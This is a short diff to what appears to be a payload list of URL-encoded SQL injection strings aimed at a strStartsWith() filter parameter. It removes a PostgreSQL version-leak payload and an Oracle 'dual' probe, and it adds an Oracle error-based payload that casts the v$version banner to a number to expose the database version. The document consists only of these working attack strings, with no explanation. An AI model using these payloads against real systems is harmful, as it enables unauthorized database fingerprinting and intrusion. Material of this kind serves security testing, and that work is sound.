@@ -1,4 +1,1 @@
-strStartsWith(name%2C%27x%27%27)%20IS%20NULL%20OR%201%3DCAST((SELECT%20version())%20AS%20INTEGER)--
-
-
-strStartsWith(name%2C%27x%27%27)%20IS%20NULL%20OR%201%3D(SELECT%201%20FROM%20dual)--
+StrStartsWith(name%2C%27x%27%27)%20%3D%20true%20and%201%3D(SELECT%20TO_NUMBER(banner)%20FROM%20v%24version%20WHERE%20rownum%3D1)%20--%20%27)%20%3D%20true
